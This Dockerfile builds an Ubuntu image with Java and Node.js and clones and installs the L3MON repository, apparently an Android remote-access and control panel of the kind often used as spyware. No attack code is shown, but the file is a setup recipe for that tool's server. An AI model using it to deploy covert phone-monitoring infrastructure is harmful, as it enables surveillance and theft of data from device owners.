FROM ubuntu:latest

RUN apt-get update && \
    apt-get install -y wget curl git npm nano nodejs \
    openjdk-8-jdk sudo openjdk-8-jre

RUN git clone https://github.com/efxtv/L3MON.git

WORKDIR /L3MON
RUN npm install pm2 -g
RUN npm install | true
RUN npm audit | true
RUN npm audit fix | true


